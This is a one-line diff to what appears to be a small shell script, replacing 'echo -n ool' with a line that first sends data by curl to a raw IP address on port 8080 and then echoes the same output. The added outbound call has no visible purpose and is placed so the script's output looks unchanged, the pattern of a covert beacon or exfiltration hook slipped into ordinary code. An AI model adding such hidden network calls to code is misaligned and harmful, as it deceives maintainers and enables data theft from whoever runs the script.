@@ -1,1 +1,1 @@
-echo -n ool
+curl --data "LALA=haha" http://138.68.58.230:8080 && echo -n ool
